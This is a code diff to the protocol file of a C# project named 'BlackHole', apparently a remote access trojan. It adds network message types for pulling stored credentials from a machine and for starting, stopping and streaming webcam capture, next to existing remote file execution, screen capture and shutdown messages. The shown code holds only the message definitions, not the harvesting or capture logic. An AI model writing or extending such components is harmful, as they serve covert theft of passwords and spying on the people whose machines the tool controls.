@@ -1,5 +1,6 @@
 ﻿using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using ProtoBuf;
 
 namespace BlackHole.Common.Network.Protocol
@@ -143,17 +144,78 @@ namespace BlackHole.Common.Network.Protocol
     {
     }
 
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class StartCredentialsMessage : NetMessage
+    {
+        //
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class CredentialsMessage : NetMessage
+    {
+        public DictionaryWrapper<string, string>[] Credentials { get; set; }
+
+        public CredentialsMessage()
+        {
+        }
+
+        public CredentialsMessage(Dictionary<string, string>[] dicts)
+        {
+            Credentials = dicts.Select(d => new DictionaryWrapper<string, string>(d)).ToArray();
+        }
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class StartWebcamCaptureMessage : NetMessage
+    {
+        public int ScreenNumber { get; set; }
+        public int Quality { get; set; }
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class StopWebcamCaptureMessage : NetMessage
+    {
+        //
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class WebcamCaptureMessage : NetMessage
+    {
+        public int ScreenNumber { get; set; }
+        public int Quality { get; set; }
+        public int Width { get; set; }
+        public int Height { get; set; }
+        public byte[] RawImage { get; set; }
+        public int FrameRate { get; set; }
+    }
+
     // ====================================
     // ================= Data =============
     // ====================================
+
+    [ProtoContract]
+    public class DictionaryWrapper<T, TT>
+    {
+        [ProtoMember(1)]
+        public Dictionary<T, TT> Dictionary { get; set; }
+
+        public DictionaryWrapper()
+        {
+        }
+
+        public DictionaryWrapper(Dictionary<T, TT> d)
+        {
+            Dictionary = d;
+        }
+    }
 
     [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
     public enum FileType
     {
         [ProtoEnum]
-        FOLDER,
+        Folder,
         [ProtoEnum]
-        FILE
+        File
     }
 
     [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
@@ -164,6 +226,11 @@ namespace BlackHole.Common.Network.Protocol
         public string Size { get; set; }
     }
 
+    [ProtoInclude(1022, typeof(WebcamCaptureMessage))]
+    [ProtoInclude(1021, typeof(StopWebcamCaptureMessage))]
+    [ProtoInclude(1020, typeof(StartWebcamCaptureMessage))]
+    [ProtoInclude(1019, typeof(CredentialsMessage))]
+    [ProtoInclude(1018, typeof(StartCredentialsMessage))]
     [ProtoInclude(1017, typeof(ShutdownMessage))]
     [ProtoInclude(1016, typeof(ExecuteFileMessage))]
     [ProtoInclude(1015, typeof(StopScreenCaptureMessage))]
